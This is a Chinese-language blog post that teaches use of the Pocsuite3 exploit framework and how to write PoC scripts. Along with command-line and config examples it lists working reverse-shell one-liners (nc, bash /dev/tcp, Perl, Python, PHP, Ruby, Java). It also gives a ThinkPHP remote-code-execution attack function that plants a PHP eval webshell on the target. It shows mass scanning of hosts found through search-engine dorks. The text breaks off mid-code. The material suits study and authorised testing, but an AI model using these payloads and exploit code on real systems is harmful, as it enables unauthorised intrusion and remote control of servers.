<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
       
      <meta name="keywords" content="生活，思考 ，渗透，审计，代码。。。" />
       
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title>Pocsuite使用及Poc编写 |  小透的少年江湖</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/haoyun.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css"
      />
      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      
      <canvas width="1777" height="841"
        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-Pocsuite使用及Poc编写"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  Pocsuite使用及Poc编写
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/" class="article-date">
  <time datetime="2022-02-07T01:56:28.000Z" itemprop="datePublished">2022-02-07</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%86%85%E5%8A%9F%E5%BF%83%E6%B3%95/">内功心法</a> / <a class="article-category-link" href="/categories/%E5%86%85%E5%8A%9F%E5%BF%83%E6%B3%95/Poc%E7%BC%96%E5%86%99/">Poc编写</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">3.5k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">16 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="Pocsuite-使用及Poc编写"><a href="#Pocsuite-使用及Poc编写" class="headerlink" title="Pocsuite 使用及Poc编写"></a>Pocsuite 使用及Poc编写</h1><hr>
<h2 id="工具简介"><a href="#工具简介" class="headerlink" title="工具简介"></a>工具简介</h2><p>PocSuite是由知道创宇 404 实验室编写的一款基于 python 的开源漏洞利用框架。PocSuite 包含漏洞检测和利用两种模式，可以针对特定漏洞对多个目标进行探测并返回漏洞检测及利用的结果。</p>
<p>下载地址: <a target="_blank" rel="noopener" href="https://github.com/knownsec/pocsuite3">https://github.com/knownsec/pocsuite3</a></p>
<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207143045516.png" class title="image-20220207143045516">



<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p>Pocsuite的使用可以通过两种方式进行，一种是直接在输入命令时指定poc文件和线程数量进行探测，另外一种是设置pocsuite.ini文件命令行默认运行。</p>
<h3 id="指定文件探测"><a href="#指定文件探测" class="headerlink" title="指定文件探测"></a>指定文件探测</h3><p>举例: 使用ZoomEye搜索ecshop并使用ecshop_rce.py探测，指定线程数量为5</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python3 cli.py --r pocs/ecshop_rce.py --dork ecshop  --threads 5</span><br><span class="line"></span><br><span class="line">#--r            指定需要使用的poc文件</span><br><span class="line">#--dork         指定搜索引擎搜索的内容(Zoomeye,shodan......)</span><br><span class="line">#--max-page     ZoomEye API 的请求翻页数（10 目标/页）</span><br><span class="line">#--search-type  ZoomEye API搜索类型，web 或者 host</span><br><span class="line">#--vul-keyword  Seebug 搜索关键词，用于在Seebug 搜索漏洞POC</span><br><span class="line">#--threads      指定线程数量</span><br></pre></td></tr></table></figure>

<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207150558967.png" class title="image-20220207150558967">



<p><strong>verify模式</strong></p>
<p>验证目标是否存在漏洞。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">单个目标验证：</span><br><span class="line">pocsuite -r tests/poc_example.py -u http://www.example.com/ --verify</span><br><span class="line"></span><br><span class="line">批量文件验证:</span><br><span class="line">pocsuite -r test/poc_example.py -f url.txt --verify</span><br><span class="line"></span><br><span class="line">扫描器（使用目录下的所有Poc对目标进行测试）:</span><br><span class="line">pocsuite -r tests/ -u http://www.example.com --verify</span><br></pre></td></tr></table></figure>





<p><strong>attack模式</strong></p>
<p>向存在漏洞的目标进行漏洞利用攻击。(用法和verify模式相同)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocsuite -r tests/poc_example.py -u http://www.example.com/ --attack</span><br></pre></td></tr></table></figure>





<h3 id="配置文件默认探测"><a href="#配置文件默认探测" class="headerlink" title="配置文件默认探测"></a>配置文件默认探测</h3><p>设置pocsuite.ini配置文件，命令行指定配置文件探测</p>
<h4 id="【Target】"><a href="#【Target】" class="headerlink" title="【Target】"></a>【Target】</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[Target]</span><br><span class="line">; target url (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)  </span><br><span class="line">url =                   ###指定探测的URL目标###</span><br><span class="line"></span><br><span class="line">; scan multiple targets given in a textual file</span><br><span class="line">url_file =              ###指定探测的URL目标文件###</span><br><span class="line"></span><br><span class="line">; load poc file from local or remote from seebug website</span><br><span class="line">poc = ecshop_rce.py     ###指定的POC文件###  </span><br><span class="line"></span><br><span class="line">; filter poc by keyword, e.g. cve-2021-22005</span><br><span class="line">poc_keyword =           ###指定的POC文件密码###</span><br></pre></td></tr></table></figure>



<h4 id="【Request】"><a href="#【Request】" class="headerlink" title="【Request】"></a>【Request】</h4><p>设置请求头部，针对某些需要登录的目标地址或自主设置HTTP请求。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[Request]</span><br><span class="line">; http cookie header value</span><br><span class="line">cookie = </span><br><span class="line">; http host header value</span><br><span class="line">host = </span><br><span class="line">; http referer header value</span><br><span class="line">referer = </span><br><span class="line">; http user-agent header value (default random)</span><br><span class="line">agent = </span><br><span class="line">; use a proxy to connect to the target url</span><br><span class="line">proxy = </span><br><span class="line">; proxy authentication credentials (name:password)</span><br><span class="line">proxy_cred = </span><br><span class="line">; seconds to wait before timeout connection (default 30)</span><br><span class="line">timeout = </span><br><span class="line">; time out retrials times</span><br><span class="line">retry =</span><br><span class="line">; delay between two request of one thread</span><br><span class="line">delay = </span><br><span class="line">; extra headers (e.g. &quot;key1: value1\nkey2: value2&quot;)</span><br><span class="line">headers = </span><br></pre></td></tr></table></figure>



<h4 id="【Mode】"><a href="#【Mode】" class="headerlink" title="【Mode】"></a>【Mode】</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[Mode]</span><br><span class="line">; run poc with verify mode</span><br><span class="line">; run poc with attack mode</span><br><span class="line">; run poc with shell mode</span><br><span class="line">mode = verify</span><br><span class="line"></span><br><span class="line">####poc需要执行的模式分为exp和verify###</span><br></pre></td></tr></table></figure>



<h4 id="【Account】"><a href="#【Account】" class="headerlink" title="【Account】"></a>【Account】</h4><p>设置搜索引擎的账号密码或者Token进行登录请求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[Account]</span><br><span class="line">; telnet404 login user</span><br><span class="line">login_user =</span><br><span class="line">; telnet404 login password</span><br><span class="line">login_pass =</span><br><span class="line"></span><br><span class="line">; Shodan token</span><br><span class="line">shodan_token =</span><br><span class="line"></span><br><span class="line">; fofa user</span><br><span class="line">fofa_user =</span><br><span class="line">; fofa token</span><br><span class="line">fofa_token =</span><br><span class="line"></span><br><span class="line">; quake token</span><br><span class="line">quake_token =</span><br><span class="line"></span><br><span class="line">; Censys uid</span><br><span class="line">censys_uid =</span><br><span class="line">; Censys secret</span><br><span class="line">censys_secret =</span><br></pre></td></tr></table></figure>



<h4 id="【Modules】"><a href="#【Modules】" class="headerlink" title="【Modules】"></a>【Modules】</h4><p>指定使用的搜索引擎进行查询，dork用来设置Zoomeye等搜索引擎的搜索语句。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[Modules]</span><br><span class="line">; zoomeye dork used for search</span><br><span class="line">dork =</span><br><span class="line">; zoomeye dork used for search</span><br><span class="line">dork_zoomeye =</span><br><span class="line">; shodan dork used for search</span><br><span class="line">dork_shodan =</span><br><span class="line">; censys dork used for search</span><br><span class="line">dork_censys =</span><br><span class="line">; fofa dork used for search</span><br><span class="line">dork_fofa =</span><br><span class="line">; quake dork used for search</span><br><span class="line">dork_quake =</span><br><span class="line">; max page used in search api</span><br><span class="line">max_page = 1</span><br><span class="line">; search type used in zoomeye api, web or host</span><br><span class="line">search_type = host</span><br><span class="line">; seebug keyword used for search</span><br><span class="line">vul_keyword =</span><br><span class="line">; seebug ssvid number for target poc</span><br><span class="line">ssvid =</span><br><span class="line">; connect back host for target poc in shell mode</span><br><span class="line">connect_back_host =</span><br><span class="line">; connect back port for target poc in shell mode</span><br><span class="line">connect_back_port =</span><br><span class="line">; enable TLS listener in shell mode</span><br><span class="line">enable_tls_listener = False</span><br><span class="line">; compare popular web search engines</span><br><span class="line">comparison = False</span><br><span class="line">; whether dork is in base64 format</span><br><span class="line">dork_b64 = False</span><br></pre></td></tr></table></figure>



<h4 id="【Optimization】"><a href="#【Optimization】" class="headerlink" title="【Optimization】"></a>【Optimization】</h4><p>设置可选选项参数，如线程等</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[Optimization]</span><br><span class="line">; load plugins to execute</span><br><span class="line">plugins =</span><br><span class="line">; user defined poc scripts path</span><br><span class="line">pocs_path =</span><br><span class="line">; max number of concurrent network requests (default 1)</span><br><span class="line">threads = 1</span><br><span class="line">; automatically choose defaut choice without asking</span><br><span class="line">batch = </span><br><span class="line">; check install_requires</span><br><span class="line">check_requires = False</span><br><span class="line">; activate quiet mode, working without logger</span><br><span class="line">quiet = False</span><br><span class="line">; hiden sensitive information when published to the network</span><br><span class="line">ppt = False</span><br><span class="line">; use scapy capture flow</span><br><span class="line">pcap = False</span><br><span class="line">; export suricata rules, default export request and response</span><br><span class="line">rule = False</span><br><span class="line">; only export suricata request rule</span><br><span class="line">rule_req = False</span><br><span class="line">; specify the name of the export rule file</span><br><span class="line">rule_filename =</span><br></pre></td></tr></table></figure>



<p>执行命令:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cli.py -c ../pocsuite.ini</span><br></pre></td></tr></table></figure>

<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207153115935.png" class title="image-20220207153115935">



<h2 id="插件工具"><a href="#插件工具" class="headerlink" title="插件工具"></a>插件工具</h2><p>通过–plugins在后面指定插件名称，多个插件可以用,分割。</p>
<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207153517654.png" class title="image-20220207153517654">



<p>例如</p>
<p>–plugins html_report将会生成HTML报表格式文档。</p>
<p>–plugins file_record将会生成HTML报表格式文档.</p>
<h2 id="Poc编写"><a href="#Poc编写" class="headerlink" title="Poc编写"></a>Poc编写</h2><p>这里以thinkphp_rce.py举例说明。</p>
<p>命名规则:PoC命名分成3个部分组成<strong>漏洞应用名_版本号__漏洞类型名称</strong> 文件名称中的所有字母改成小写.</p>
<p>参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34640691/article/details/109119942">(58条消息) 关于pocsuite下的pocs代码分析_willow_liang的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45007073/article/details/113094045">(58条消息) POC和EXP脚本_平凡的学者的博客-CSDN博客_exp脚本</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44426869/article/details/103962994">(58条消息) 使用Pocsuite3框架并编写简单PoC例子_情感博主V-CSDN博客_pocsuite3使用</a></p>
<h3 id="方法格式使用"><a href="#方法格式使用" class="headerlink" title="方法格式使用"></a>方法格式使用</h3><p>编写Poc主要分为Poc介绍信息模块，漏洞检测模块，漏洞利用模块，返回结果模块。</p>
<p>开头是对该Poc的简介，关于创建的时间、作者的名字，针对该Poc的漏洞信息和执行判断结果。</p>
<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207154854764.png" class title="image-20220207154854764">



<h4 id="def-options-self"><a href="#def-options-self" class="headerlink" title="def_options(self)"></a>def_options(self)</h4><p>该函数针对RCE类POC，需要执行相关命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def _options(self):</span><br><span class="line">      o = OrderedDict()   ##实例化OrdereDict类对象o</span><br><span class="line">      payload = &#123;</span><br><span class="line">          ##调用REVERSE_PAYLOAD类的NC属性和BASH属性</span><br><span class="line">          &quot;nc&quot;: REVERSE_PAYLOAD.NC,</span><br><span class="line">          &quot;bash&quot;: REVERSE_PAYLOAD.BASH,</span><br><span class="line">      &#125;</span><br><span class="line">      o[&quot;command&quot;] = OptDict(selected=&quot;bash&quot;, default=payload)</span><br><span class="line">      ##调用OPtDict()函数将bash字符串传给o的command键值</span><br><span class="line">      </span><br><span class="line">      return o</span><br></pre></td></tr></table></figure>



<p>上述代码中涉及到的相关代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">REVERSE_PAYLOAD</span>:</span></span><br><span class="line">    NC = <span class="string">&quot;&quot;&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &#123;0&#125; &#123;1&#125; &gt;/tmp/f&quot;&quot;&quot;</span></span><br><span class="line">    NC2 = <span class="string">&quot;&quot;&quot;nc -e /bin/sh &#123;0&#125; &#123;1&#125;&quot;&quot;&quot;</span></span><br><span class="line">    NC3 = <span class="string">&quot;&quot;&quot;rm -f /tmp/p;mknod /tmp/p p &amp;&amp; nc &#123;0&#125; &#123;1&#125; 0/tmp/p&quot;&quot;&quot;</span></span><br><span class="line">    BASH = <span class="string">&quot;&quot;&quot;bash -c &#x27;sh -i &gt;&amp; /dev/tcp/&#123;0&#125;/&#123;1&#125; 0&gt;&amp;1&#x27;&quot;&quot;&quot;</span></span><br><span class="line">    BASH2 = <span class="string">&quot;&quot;&quot;bash -c &#x27;sh -i &amp;gt;&amp;amp; /dev/tcp/&#123;0&#125;/&#123;1&#125; 0&amp;gt;&amp;amp;1&#x27;&quot;&quot;&quot;</span></span><br><span class="line">    TELNET = <span class="string">&quot;&quot;&quot;rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet &#123;0&#125; &#123;1&#125; 0/tmp/p&quot;&quot;&quot;</span></span><br><span class="line">    PERL = <span class="string">&quot;&quot;&quot;perl -e &#x27;use Socket;$i=&quot;&#123;0&#125;&quot;;$p=&#123;1&#125;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;&#125;;&#x27;&quot;&quot;&quot;</span></span><br><span class="line">    PYTHON = <span class="string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&#123;0&#125;&quot;,&#123;1&#125;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span></span><br><span class="line">    PHP = <span class="string">&quot;&quot;&quot;php -r &#x27;$sock=fsockopen(&quot;&#123;0&#125;&quot;,&#123;1&#125;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;&quot;&quot;&quot;</span></span><br><span class="line">    RUBY = <span class="string">&quot;&quot;&quot;ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;&#123;0&#125;&quot;,&#123;1&#125;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;&quot;&quot;&quot;</span></span><br><span class="line">    JAVA = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    r = Runtime.getRuntime()</span></span><br><span class="line"><span class="string">    p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/&#123;0&#125;/&#123;1&#125;;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span></span><br><span class="line"><span class="string">    p.waitFor()</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OptDict</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, require=<span class="literal">False</span>, selected=<span class="literal">False</span>, default=&#123;&#125;</span>):</span></span><br><span class="line">        <span class="comment"># super().__init__(default, &#x27;&#x27;, require)</span></span><br><span class="line">        self.default = &#123;&#125;</span><br><span class="line">        b = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> default.items():</span><br><span class="line">            self.default[k] = v</span><br><span class="line">            b += <span class="string">&quot;&#123;k&#125;:&#123;v&#125;\n&quot;</span>.<span class="built_in">format</span>(k=k, v=v)</span><br><span class="line">        self.selected = selected</span><br><span class="line">        self.require = require</span><br><span class="line">        self.<span class="built_in">type</span> = <span class="string">&quot;Dict&quot;</span></span><br><span class="line">        self.__set__(<span class="string">&quot;&quot;</span>, selected)</span><br><span class="line"></span><br><span class="line">        self.description = <span class="string">&quot;&#123;&#125;\nYou can select &#123;&#125; ,default:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(b,</span><br><span class="line">                                                                      <span class="built_in">repr</span>(self.default.keys()),self.selected)</span><br></pre></td></tr></table></figure>



<h4 id="def-verify-self"><a href="#def-verify-self" class="headerlink" title="def _verify(self)"></a>def _verify(self)</h4><p>_verify()漏洞检测函数为Poc中最重要的函数，检测漏洞是否存在的逻辑关系。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def _verify(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        p = self._check(self.url)</span><br><span class="line">        if p:</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;] = &#123;&#125;</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = p[0]</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;Postdata&#x27;] = p[1]</span><br><span class="line"></span><br><span class="line">        return self.parse_output(result)</span><br></pre></td></tr></table></figure>



<p>当该poc为exp模块时，_verify()为固定写法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def _verify(self):	#exp模块固定写法</span><br><span class="line">       output = Output(self)</span><br><span class="line">       result = &#123;&#125;</span><br></pre></td></tr></table></figure>



<h4 id="def-attack-self"><a href="#def-attack-self" class="headerlink" title="def _attack(self)"></a>def _attack(self)</h4><p>该方法为攻击模式的方法，编写对该漏洞利用的代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def _attack(self):</span><br><span class="line">       result = &#123;&#125;</span><br><span class="line">       filename = random_str(6) + &quot;.php&quot;</span><br><span class="line">       webshell = r&#x27;&#x27;&#x27;&lt;?php echo &quot;green day&quot;;@eval($_POST[&quot;pass&quot;]);?&gt;&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">       p = self._check(self.url)</span><br><span class="line">       if p:</span><br><span class="line">           data = p[1]</span><br><span class="line">           data[&quot;vars[1][]&quot;] = &quot;echo%20%27&#123;content&#125;%27%20&gt;%20&#123;filename&#125;&quot;.format(filename=filename,</span><br><span class="line">                                                                                content=quote(webshell))</span><br><span class="line">           data[&quot;vars[0]&quot;] = &quot;system&quot;</span><br><span class="line">           vulurl = self.url + p[0]</span><br><span class="line">           requests.post(vulurl, data=data)</span><br><span class="line">           r = requests.get(self.url + &quot;/&quot; + filename)</span><br><span class="line">           if r.status_code == 200 and &quot;green day&quot; in r.text:</span><br><span class="line">               result[&#x27;ShellInfo&#x27;] = &#123;&#125;</span><br><span class="line">               result[&#x27;ShellInfo&#x27;][&#x27;URL&#x27;] = self.url + &quot;/&quot; + filename</span><br><span class="line">               result[&#x27;ShellInfo&#x27;][&#x27;Content&#x27;] = webshell</span><br><span class="line">       if not result:</span><br><span class="line">           vulurl = self.url + r&quot;/index.php?s=index/\think\template\driver\file/write&amp;cacheFile=&#123;filename&#125;&amp;content=&#123;content&#125;&quot;</span><br><span class="line">           vulurl = vulurl.format(filename=filename, content=quote(webshell))</span><br><span class="line">           requests.get(vulurl)</span><br><span class="line">           r = requests.get(self.url + &quot;/&quot; + filename)</span><br><span class="line">           if r.status_code == 200 and &quot;green day&quot; in r.text:</span><br><span class="line">               result[&#x27;ShellInfo&#x27;] = &#123;&#125;</span><br><span class="line">               result[&#x27;ShellInfo&#x27;][&#x27;URL&#x27;] = self.url + &quot;/&quot; + filename</span><br><span class="line">               result[&#x27;ShellInfo&#x27;][&#x27;Content&#x27;] = webshell</span><br><span class="line"></span><br><span class="line">       return self.parse_output(result)</span><br></pre></td></tr></table></figure>



<p>若该poc没有攻击模式，该方法可返回_verify()方法或者不写该方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def _attack(self):			#注意:若该poc没有攻击模式，在_attack函数下，return self._verify(),不用再写_attack()</span><br><span class="line">return self._verify()</span><br></pre></td></tr></table></figure>



<h4 id="def-parse-output-self-result"><a href="#def-parse-output-self-result" class="headerlink" title="def parse_output(self, result)"></a>def parse_output(self, result)</h4><p>使用Output()函数判断探测结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">def parse_output(self, result):</span><br><span class="line">    output = Output(self)</span><br><span class="line">    if result:</span><br><span class="line">        output.success(result)</span><br><span class="line">    else:</span><br><span class="line">        output.fail(&#x27;target is not vulnerable&#x27;)</span><br><span class="line">    return output</span><br><span class="line">register_poc(DemoPOC)</span><br></pre></td></tr></table></figure>



<p>上述POC中涉及到的Output类代码，通过isinstance()函数判断传入的result是否为字典类型。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">class Output(object):</span><br><span class="line">    def __init__(self, poc=None):</span><br><span class="line">        self.error_msg = 